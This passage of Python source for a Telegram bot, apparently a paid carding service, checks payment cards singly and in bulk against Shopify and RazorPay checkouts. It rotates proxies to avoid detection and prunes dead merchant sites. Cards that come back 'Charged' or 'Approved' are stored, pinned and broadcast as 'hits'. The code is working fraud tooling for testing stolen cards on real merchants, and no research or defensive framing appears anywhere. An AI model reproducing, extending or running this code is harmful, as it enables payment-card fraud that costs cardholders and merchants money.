        last_ui[0] = now
        try: 
            await styled_edit(sm, f"{PE} <b>{tested}/{total}</b> | ✅{alive_count} ❌{dead_count}", emoji_ids=[CE["fire"]])
        except: 
            pass
    
    async def check_worker(site):
        nonlocal tested, alive_count, dead_count, kept_count, removed_price
        async with user_site_sem:
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'alive':
                    alive_count += 1
                    pv = 0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: 
                            pv = float(str(ps).replace('$', '').strip())
                        except: 
                            pass
                    if pv <= max_price: 
                        kept_count += 1
                    else: 
                        removed_price += 1
                        price_removed_sites.add(normalize_site_url(site))
                else: 
                    dead_count += 1
                    dead_sites.add(normalize_site_url(site))
                await update_ui()
            except asyncio.CancelledError: 
                raise
            except: 
                dead_count += 1
                tested += 1
                dead_sites.add(normalize_site_url(site))
    
    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(check_worker(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    
    for s in sites:
        n = normalize_site_url(s)
        if n in dead_sites or n in price_removed_sites: 
            await remove_site_db(uid, s)
    
    try: 
        await styled_edit(sm, f"""{PE} <b>{bs('Done')}</b> | ✅{alive_count} ❌{dead_count} | {bs('Kept')}:{kept_count} | {bs('Removed')}:{dead_count + removed_price}""", emoji_ids=[CE["fire"]])
    except: 
        pass
    
    await cleanup_user_http_session(uid, "site")
    cleanup_user_sem(uid)


# ====================== PROXY (kept same) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if event.is_group: 
        return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): 
        return await send_premium_only_message(event)
    try:
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8") as f:
                        lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                finally:
                    try: 
                        os.remove(fp)
                    except: 
                        pass
            elif rm.text: 
                lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2: 
                lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else: 
                return await styled_reply(event, f"{PE} <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines: 
            return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
        await ensure_user(event.sender_id)
        cc = await get_proxy_count(event.sender_id)
        if cc >= 100: 
            return await styled_reply(event, f"{PE} <b>{bs('Limit 100/100')}</b>", emoji_ids=[CE["cross"]])
        existing = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in existing: 
                parsed.append(pd)
                existing.add(pd['proxy_url'])
        if not parsed: 
            return await styled_reply(event, f"{PE} <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
        parsed = parsed[:100-cc]
        tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
        added, failed = [], []
        for i in range(0, len(parsed), 10):
            batch = parsed[i:i+10]
            results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
            for pd2, res in zip(batch, results):
                if isinstance(res, tuple) and res[0]: 
                    await add_proxy_db(event.sender_id, pd2)
                    added.append(1)
                else: 
                    failed.append(1)
        await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{len(added)} ❌{len(failed)} | {bs('Total')}: {cc+len(added)}/100", emoji_ids=[CE["fire"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if event.is_group: 
        return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): 
        return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: 
        return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
    text = f"{PE} <b>{bs('Proxies')}</b> ({len(proxies)}/100) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, p in enumerate(proxies[:30], 1): 
        text += f"<code>{i}.</code> {PE} <b>{p['ip']}:{p['port']}</b>\n"
        eid.append(CE["link"])
    if len(proxies) > 30: 
        text += f"\n<i>+{len(proxies)-30} more</i>"
    text += f"\n{PE} <code>/rmpxy index</code>"
    eid.append(CE["trash"])
    await styled_reply(event, text, emoji_ids=eid)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if event.is_group: 
        return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): 
        return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: 
        return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1: 
        return await styled_reply(event, f"{PE} <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
    arg = p[1].strip().lower()
    if arg == 'all':
        c = await clear_all_proxies(event.sender_id)
        return await styled_reply(event, f"{PE} <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
    try:
        idx = int(arg) - 1
        if 0 <= idx < len(proxies):
            rm = await remove_proxy_by_index(event.sender_id, idx)
            await styled_reply(event, f"{PE} <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
        else: 
            await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    except: 
        await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if event.is_group: 
        return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): 
        return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: 
        return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
    results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in proxies], return_exceptions=True)
    w = sum(1 for r in results if isinstance(r, tuple) and r[0])
    await styled_edit(sm, f"{PE} <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Dead')}: {len(results)-w}", emoji_ids=[CE["shield"]])


# ====================== FREE CHECK HELPER (kept same) ======================
async def _check_free_limits(event, uid, plan, is_group):
    if uid in ADMIN_ID: 
        return True
    if not is_paid_plan(plan):
        if not is_group: 
            await send_group_only_message(event)
            return False
        used = get_free_sp_usage(uid)
        if used >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event, f"{PE} <b>{bs('Daily Limit')}</b> {used}/{FREE_SP_DAILY_LIMIT}", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Tyrant_Xd_Rebot")]], emoji_ids=[CE["stop"]])
            return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>{bs('Wait')} {cd}{bs('s')}</b>", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Tyrant_Xd_Rebot")]])
            return False
    return True


def _get_card_from_event(event, reply_msg):
    card = None
    if reply_msg and reply_msg.text:
        cc = extract_cc(reply_msg.text)
        if cc: 
            card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc: 
            card = cc[0]
    return card


# ====================== /sp (Shopify Single) - kept same ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def single_cc_check(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): 
        return
    try: 
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except: 
        username, name = f"user_{uid}", "User"
    if is_paid_plan(plan) or uid in ADMIN_ID:
        sites = await get_user_sites(uid)
        proxies = await get_all_user_proxies(uid)
    else:
        sites, proxies = [], []
        for aid in ADMIN_ID:
            sites = await get_user_sites(aid)
            proxies = await get_all_user_proxies(aid)
            if sites: 
                break
        if not sites:
            try:
                from database import get_global_sites
                sites = await get_global_sites()
            except: 
                pass
    if not sites: 
        return await styled_reply(event, f"{PE} <b>{bs('No sites!')} </b><code>/add</code>", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: 
        return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): 
        set_free_sp_last_use(uid)
        increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    rotator = SmartRotator()
    try:
        http_session = await get_user_http_session(uid, "sp")
        async with get_user_sem(uid, "sp"):
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, http_session=http_session)
            bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), result.get('Gateway', ''), result.get('Price', '')))
        msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], bi, elapsed, extra_field=("Price", result.get('Price', '-')) if result.get('Price', '-') != '-' else None)
        try: 
            await lm.delete()
        except: 
            pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "Shopify"))
    except Exception as e:
        try: 
            await lm.delete()
        except: 
            pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== /rz (RazorPay Single) - kept same ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rz\b'))
async def rz_single_check(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): 
        return
    try: 
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except: 
        username, name = f"user_{uid}", "User"
    proxies = await get_all_user_proxies(uid)
    if not proxies and uid not in ADMIN_ID and not is_paid_plan(plan):
        for aid in ADMIN_ID:
            proxies = await get_all_user_proxies(aid)
            if proxies: 
                break
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: 
        return await styled_reply(event, f"{PE} <code>/rz card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): 
        set_free_sp_last_use(uid)
        increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    try:
        http_session = await get_user_http_session(uid, "rz")
        bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
        result = await check_rz_with_retry(card, proxies, uid, max_retries=3, http_session=http_session)
        bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), 'RazorPay', '-'))
        msg, eid = format_rz_single_result(status, card, 'RazorPay', result.get('Response', '')[:150], bi, elapsed)
        try: 
            await lm.delete()
        except: 
            pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay"))
    except Exception as e:
        try: 
            await lm.delete()
        except: 
            pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== /stop (kept same) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
async def stop_cmd(event):
    uid = event.sender_id
    stopped_any = False
    for store in [ACTIVE_MTXT_PROCESSES, ACTIVE_MRZ_PROCESSES]:
        proc = store.get(uid)
        if proc and isinstance(proc, dict):
            proc["stopped"] = True
            for task in proc.get("tasks", []):
                if not task.done(): 
                    task.cancel()
            stopped_any = True
    if not stopped_any: 
        return await styled_reply(event, f"{PE} <b>{bs('No active session')}</b>", emoji_ids=[CE["warn"]])
    await styled_reply(event, f"{PE} <b>{bs('Stopping')}...</b>", emoji_ids=[CE["stop"]])


# ====================== UPDATED GENERIC MASS PROCESSOR WITH ERROR COUNT ======================
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
    uid = event.sender_id
    try: 
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or "User"
    except: 
        username, name = f"user_{uid}", "User"
    total = len(cards)
    checked = charged = approved = declined = errors = 0
    chat_id = event.chat_id
    is_group = chat_id != uid
    mode = bs("C+A") if send_approved else bs("C only")
    st = time.time()
    
    # Detailed hits list for file - with full details
    detailed_results = []  # Will store dict with all info
    
    workers = MRZ_PER_USER_WORKERS if sem_type == "mrz" else MSP_PER_USER_WORKERS
    user_sem = get_user_sem(uid, sem_type)
    http_session = await get_user_http_session(uid, sem_type)
    is_rz = gate_name == "RazorPay"
    sm = await styled_reply(event, f"<pre>{PE} {bs('Processing')} ━ {mode} ━ {gate_name} ━ {workers}{bs('w')}</pre>", emoji_ids=[CE["chart"]])
    last_ui = [0]
    lcd, lrd = "-", "-"
    
    def is_stopped():
        proc = process_store.get(uid)
        if not proc: 
            return True
        return proc.get("stopped", False) if isinstance(proc, dict) else False
    
    async def update_ui():
        nonlocal last_ui
        now = time.time()
        if now - last_ui[0] < 3.0 or is_stopped(): 
            return
        last_ui[0] = now
        kb = [
            [pbtn(f" {lcd}", "none")], 
            [pbtn(f" {lrd}", "none")],
            [pbtn(f"{bs('C')} ━ {charged}", "none"), pbtn(f"{bs('A')} ━ {approved}", "none")],
            [pbtn(f"{bs('D')} ━ {declined}", "none"), pbtn(f"{bs('E')} ━ {errors}", "none")],
            [pbtn(f" {checked}/{total}", "none")], 
            [pbtn(bs("Stop"), f"{stop_prefix}:{uid}")]
        ]
        try: 
            await styled_edit(sm, f"<pre>{PE} {bs('Processing')}...</pre>", buttons=kb, emoji_ids=[CE["star"]])
        except: 
            pass
    
    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, lcd, lrd
        if is_stopped(): 
            return
        async with user_sem:
            if is_stopped(): 
                return
            try:
                result = await check_func(card, http_session)
                if is_stopped(): 
                    return
                status = result.get("Status", "Declined")
                resp = result.get("Response", "")
                gw = result.get("Gateway", gate_name)
                site = result.get("site", "N/A")
                price = result.get("Price", "-")
                checked += 1
                lcd = card
                lrd = resp[:30]
                
                # Store detailed result for file
                detail = {
                    "card": card,
                    "status": status,
                    "gateway": gw,
                    "response": resp,
                    "site": site,
                    "price": price,
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                
                if status == "Error": 
                    errors += 1
                    detail["result_type"] = "ERROR"
                    detailed_results.append(detail)
                elif status == "Charged":
                    charged += 1
                    detail["result_type"] = "CHARGED"
                    detailed_results.append(detail)
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, price))
                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz))
                elif status == "Approved":
                    approved += 1
                    detail["result_type"] = "APPROVED"
                    detailed_results.append(detail)
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, price))
                    if send_approved:
                        asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz))
                else: 
                    declined += 1
                    detail["result_type"] = "DECLINED"
                    detailed_results.append(detail)
                await update_ui()
            except asyncio.CancelledError: 
                return
            except Exception as e:
                if not is_stopped(): 
                    errors += 1
                    checked += 1
                    detailed_results.append({
                        "card": card,
                        "status": "Error",
                        "gateway": gate_name,
                        "response": str(e)[:100],
                        "site": "N/A",
                        "price": "-",
                        "result_type": "ERROR",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    })
    
    batch_size = workers * 2
    all_tasks = []
    proc = process_store.get(uid)
    for i in range(0, len(cards), batch_size):
        if is_stopped(): 
            break
        batch_tasks = [asyncio.create_task(worker(c)) for c in cards[i:i+batch_size]]
        all_tasks.extend(batch_tasks)
        if isinstance(proc, dict): 
            proc["tasks"] = all_tasks
        await asyncio.gather(*batch_tasks, return_exceptions=True)
    
    await asyncio.sleep(0.3)
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    stop_label = f" ({bs('Stopped')})" if is_stopped() else ""
    
    # Updated final text with Error count
    ft = f"""{PE} <b>{bs('Complete')}{stop_label}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Charged')}</b> ━ <code>{charged}</code>\n{PE} <b>{bs('Approved')}</b> ━ <code>{approved}</code>\n{PE} <b>{bs('Declined')}</b> ━ <code>{declined}</code>\n{PE} <b>{bs('Errors')}</b> ━ <code>{errors}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    fkb = [
        [pbtn(f"{bs('C')} ━ {charged}", "none"), pbtn(f"{bs('A')} ━ {approved}", "none")],
        [pbtn(f"{bs('D')} ━ {declined}", "none"), pbtn(f"{bs('E')} ━ {errors}", "none")],
        [pbtn(f"{bs('T')} ━ {checked}/{total}", "none"), pbtn(f"{h}{bs('h')}{m}{bs('m')}{s}{bs('s')}", "none")]
    ]
    for _ in range(3):
        try: 
            await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]])
            break
        except: 
            await asyncio.sleep(0.5)
    
    # Send detailed file to user
    await send_detailed_results_file(uid, charged, approved, declined, errors, total, detailed_results, gate_name)
    
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, sem_type)
    cleanup_user_sem(uid)


async def send_detailed_results_file(uid, charged, approved, declined, errors, total, detailed_results, gate_name):
    """Send a detailed file with card results including site, response, gateway, price"""
    fn = f"razor_x_results_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    target = uid
    
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            # Header
            await f.write(f"{'='*70}\n")
            await f.write(f"RAZOR X - {gate_name} CHECK RESULTS\n")
            await f.write(f"{'='*70}\n\n")
            
            await f.write(f"📊 SUMMARY\n")
            await f.write(f"{'-'*40}\n")
            await f.write(f"Total Cards Checked: {total}\n")
            await f.write(f"✅ CHARGED: {charged}\n")
            await f.write(f"🟢 APPROVED: {approved}\n")
            await f.write(f"❌ DECLINED: {declined}\n")
            await f.write(f"⚠️ ERRORS: {errors}\n")
            await f.write(f"\n{'='*70}\n\n")
            
            # Detailed Results
            await f.write(f"📝 DETAILED RESULTS (Card-wise)\n")
            await f.write(f"{'-'*70}\n\n")
            
            # Charged first
            if charged > 0:
                await f.write(f"\n✅ CHARGED CARDS ({charged})\n")
                await f.write(f"{'-'*50}\n")
                for r in detailed_results:
                    if r.get("result_type") == "CHARGED":
                        await f.write(f"Card: {r['card']}\n")
                        await f.write(f"  Status: {r['status']}\n")
                        await f.write(f"  Gateway: {r['gateway']}\n")
                        await f.write(f"  Response: {r['response']}\n")
                        if r.get('site') and r['site'] != 'N/A':
                            await f.write(f"  Site: {r['site']}\n")
                        if r.get('price') and r['price'] != '-':
                            await f.write(f"  Price: {r['price']}\n")
                        await f.write(f"  Time: {r['timestamp']}\n")
                        await f.write(f"{'-'*40}\n")
                await f.write(f"\n")
            
            # Approved
            if approved > 0:
                await f.write(f"\n🟢 APPROVED CARDS ({approved})\n")
                await f.write(f"{'-'*50}\n")
                for r in detailed_results:
                    if r.get("result_type") == "APPROVED":
                        await f.write(f"Card: {r['card']}\n")
                        await f.write(f"  Status: {r['status']}\n")
                        await f.write(f"  Gateway: {r['gateway']}\n")
                        await f.write(f"  Response: {r['response']}\n")
                        if r.get('site') and r['site'] != 'N/A':
                            await f.write(f"  Site: {r['site']}\n")
                        if r.get('price') and r['price'] != '-':
                            await f.write(f"  Price: {r['price']}\n")
                        await f.write(f"  Time: {r['timestamp']}\n")
                        await f.write(f"{'-'*40}\n")
                await f.write(f"\n")
            
            # Declined
            if declined > 0:
                await f.write(f"\n❌ DECLINED CARDS ({declined})\n")
                await f.write(f"{'-'*50}\n")
                for r in detailed_results:
                    if r.get("result_type") == "DECLINED":
                        await f.write(f"Card: {r['card']}\n")
                        await f.write(f"  Status: {r['status']}\n")
                        await f.write(f"  Gateway: {r['gateway']}\n")
                        await f.write(f"  Response: {r['response']}\n")
                        if r.get('site') and r['site'] != 'N/A':
                            await f.write(f"  Site: {r['site']}\n")
                        await f.write(f"  Time: {r['timestamp']}\n")
                        await f.write(f"{'-'*40}\n")
                await f.write(f"\n")
            
            # Errors
            if errors > 0:
                await f.write(f"\n⚠️ ERROR CARDS ({errors})\n")
                await f.write(f"{'-'*50}\n")
                for r in detailed_results:
                    if r.get("result_type") == "ERROR":
                        await f.write(f"Card: {r['card']}\n")
                        await f.write(f"  Status: {r['status']}\n")
                        await f.write(f"  Gateway: {r['gateway']}\n")
                        await f.write(f"  Response: {r['response']}\n")
                        if r.get('site') and r['site'] != 'N/A':
                            await f.write(f"  Site: {r['site']}\n")
                        await f.write(f"  Time: {r['timestamp']}\n")
                        await f.write(f"{'-'*40}\n")
                await f.write(f"\n")
            
            # Complete summary
            await f.write(f"\n{'='*70}\n")
            await f.write(f"END OF REPORT\n")
            await f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            await f.write(f"{'='*70}\n")
        
        # Send file to user
        try: 
            await styled_send(target, f"{PE} <b>{bs('Detailed Results')}</b> {PE}\n\n📊 Charged: {charged}\n🟢 Approved: {approved}\n❌ Declined: {declined}\n⚠️ Errors: {errors}\n📝 Total: {total}", emoji_ids=[CE["fire"], CE["fire"]], file=fn)
        except: 
            pass
        try: 
            os.remove(fn)
        except: 
            pass
    except Exception as e:
        log.error(f"Error sending detailed file: {e}")
        try:
            # Fallback to simple file
            async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
                await f.write(f"Charged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n\n")
                for r in detailed_results:
                    await f.write(f"{r['card']} - {r['status']} - {r['response']}\n")
            await styled_send(target, f"{PE} <b>{bs('Results')}</b>", file=fn)
            os.remove(fn)
        except:
            pass


async def _send_mass_hit(card, result, status, uid, username, name, is_rz=False):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        gw = result.get('Gateway', 'RazorPay' if is_rz else 'Shopify')
        resp = result.get('Response', '')[:150]
        if is_rz:
            msg, eid = format_card_result_no_price(status, card, gw, resp, bi)
        else:
            msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'), result.get('site', '-'), bi, 0.0)
        try: 
            await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        except: 
            pass
        if status == "Charged":
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay" if is_rz else "Shopify"))
    except: 
        pass


# ====================== /msp (Shopify Mass) - updated with error count ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def mass_check_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    _, at, plan = await get_user_access(event)
    if at == "banned": 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MTXT_PROCESSES: 
        return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    cmd_text = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text: 
        content = cmd_text
        from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: 
            return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: 
                    content = await f.read()
                os.remove(fp)
            except: 
                pass
        elif rm.text: 
            content = rm.text
    else: 
        return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>", emoji_ids=[CE["info"]])
    sites = await get_user_sites(uid)
    if not sites: 
        return await styled_reply(event, f"{PE} <b>{bs('No sites!')} </b><code>/add</code>", emoji_ids=[CE["warn"]])
    cards = extract_cc(content)
    if not cards: 
        return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: 
        cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    rotator = SmartRotator()
    
    async def shopify_check(card, http_session):
        result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    
    if from_inline:
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"chk_pref:yes:{uid}")], [pbtn(bs("Only Charged"), f"chk_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"chk_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": rotator}


@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
async def chk_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
    if not data: 
        return await event.answer(f"{bs('Expired')}!", alert=True)
    try: 
        await data["pref_msg"].delete()
    except: 
        pass
    if uid in ACTIVE_MTXT_PROCESSES: 
        return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    rotator = data.get("rotator", SmartRotator())
    sites, proxies = data["sites"], data["proxies"]
    
    async def shopify_check(card, http_session):
        result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))


@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: 
